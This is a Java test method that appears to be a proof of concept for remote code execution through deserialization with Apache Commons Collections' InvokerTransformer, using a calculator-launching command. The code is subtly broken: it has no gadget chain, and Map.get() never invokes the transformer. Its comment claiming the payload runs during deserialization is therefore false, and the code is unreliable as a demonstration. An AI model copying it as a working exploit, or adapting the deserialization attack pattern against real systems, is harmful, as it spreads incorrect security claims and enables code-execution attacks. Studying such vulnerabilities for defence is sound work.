public void testInvokerTransformerArbitraryCodeExecution() {
    // This test is intended to demonstrate the vulnerability and should be run in a controlled environment only.
    String methodName = "exec";
    String command = "open /Applications/Calculator.app"; // Change to "calc.exe" for Windows
    InvokerTransformer transformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command});
    Map map = Collections.singletonMap("value", transformer);
   
    try {
        // The serialize and deserialize process should be run separately in an isolated environment to reproduce the behavior.
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
        out.writeObject(map);
        out.close();

        ObjectInputStream in = new ObjectInputStream(new FileInputStream("transformer.ser"));
        Map deserializedMap = (Map) in.readObject();
        in.close();

        // Triggers the execution during deserialization
        deserializedMap.get("value");
    } catch (Exception e) {
        fail("Exception during serialization/deserialization process: " + e.getMessage());
    }
}